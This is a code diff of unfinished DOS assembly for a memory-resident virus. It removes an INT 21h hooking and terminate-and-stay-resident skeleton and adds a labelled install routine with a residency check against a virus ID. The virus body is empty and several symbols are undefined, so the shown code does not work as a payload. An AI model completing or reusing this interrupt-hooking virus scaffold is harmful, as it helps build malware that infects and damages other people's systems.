@@ -12,43 +12,23 @@ start:
    ;mov dl,'A' ; print 'A'
    ;mov ah,2h
    ;int 21h
-    ; saving old interrupt vector --> Get current interrupt handler for INT 21h
-    mov ax, 3521h ; DOS function 35h GET INTERRUPT VECTOR for interrupt 21h --> AH=35h - GET INTERRUPT VECTOR and AL=21h for int 21
-    int 21h ; Call DOS  (Current interrupt handler returned in ES:BX)
-    mov [old_interrupt_21h], bx
-    mov [old_interrupt_21h + 2], es
+    START:
+jmp INSTALL_VIRUS ;go to the installation routine
 
-    ; setting new interrupt vector
-    cli ; Clear interrupt flag; interrupts disabled when interrupt flag cleared.
-    push ds
-    push cs
-    pop ds
-    lea dx, myint21h ; Load DX with the offset address of the start of this TSR program (the virus body)
-    mov ax, 2521h ; DOS function 25h SET INTERRUPT VECTOR for interrupt 21h
-    int 21h
-    pop ds
-    sti ;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
 
-    ; TSR
-    mov dx, 00ffh  ; I don't know how many paragraphs to keep resident, so keep a bunch (maybe its will change) 
-    mov ax, 3100h ; DOS function TSR, return code 00h
-    int 21h       ; Call my own TSR program first, then call DOS
+INSTALL_VIRUS:
+GetRelocation bp
+;VIRUS RESIDENCY CHECK 
+mov ax, nVirusID
+int 21h
+cmp bx, nVirusID ;virus are installed ?
+je VIRUS_ALREADY_INSTALLED
 
-    ; here comes data & hew handler part
-    .data
-    old_interrupt_21h dw ?, ?
 
-    myint21h proc ;specifies that the procedure is a standard procedure function
-    ; here come the virus  body
-    
-    
-    
-    ; transfer control to an old interrupt 21h handler
-        push word ptr [cs:old_interrupt_21h + 2] ; segment
-        push word ptr [cs:old_interrupt_21h]     ; offset
-        retf
-    myint21h endp
 
+VIRUS_ALREADY_INSTALLED:
+
+END_OF_CODE:
 end start
 
 
